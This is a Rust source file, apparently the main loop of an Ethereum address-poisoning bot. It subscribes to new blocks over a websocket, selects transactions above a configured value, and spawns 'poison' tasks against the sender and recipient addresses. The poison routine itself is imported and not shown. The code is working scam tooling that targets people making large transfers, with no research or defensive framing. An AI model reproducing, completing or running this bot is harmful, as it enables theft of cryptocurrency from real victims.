use crate::config::get_config;
use crate::poison::poison;
use crate::providers::get_ws_provider;
use alloy::consensus::Transaction;
use alloy::network::TransactionResponse;
use alloy::primitives::U256;
use alloy::providers::Provider;
use futures_util::StreamExt;
use log::info;
use rocksdb::DB;
use std::ops::Mul;
use std::sync::Arc;

mod config;
mod poison;
mod providers;
mod utils;

#[tokio::main]
async fn main() {
    env_logger::init();

    let config = Arc::new(get_config());
    let target_value = U256::from(config.target.value);
    let target_value = target_value.mul(U256::from(10).pow(U256::from(18)));

    let db = Arc::new(DB::open_default("db").unwrap());
    let ws_provider = get_ws_provider(&config.ws_url).await;

    let mut stream = ws_provider
        .subscribe_full_blocks()
        .full()
        .into_stream()
        .await
        .unwrap();

    while let Some(block) = stream.next().await {
        let block = block.unwrap();
        info!("new block received | number {}", block.number());

        for transaction in block.into_transactions_iter() {
            if transaction.value() > target_value {
                info!("new transaction received | hash {}", transaction.tx_hash());

                if config.target.from {
                    tokio::spawn(poison(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        transaction.to().unwrap(),
                        transaction.from(),
                    ));
                }

                if config.target.to && transaction.to().is_some() {
                    tokio::spawn(poison(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        transaction.from(),
                        transaction.to().unwrap(),
                    ));
                }
            }
        }
    }
}
